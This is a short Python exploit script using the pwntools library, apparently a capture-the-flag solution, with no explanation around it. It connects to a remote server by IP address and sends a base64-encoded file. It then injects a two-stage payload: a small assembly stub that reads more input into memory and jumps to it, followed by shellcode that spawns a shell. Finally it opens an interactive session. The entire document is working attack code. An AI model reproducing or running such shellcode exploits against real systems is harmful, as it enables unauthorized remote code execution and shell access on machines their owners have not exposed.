from pwn import *
import base64

# Connect to the remote server
p = remote("117.53.46.98", 12000)

# Read and encode
with open("foo", "rb") as f:
    b64_data = base64.b64encode(f.read())

# Send base64 as a single line
p.sendline(b64_data)
stage1 = asm(
"""
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov al, 0x3
    add ecx, 0x10
    mov dl, 0x7f
    int 0x80
    jmp ecx
""")

p.send(stage1)
p.send(asm(shellcraft.sh()))
# Optional: Interact with the server
p.interactive()
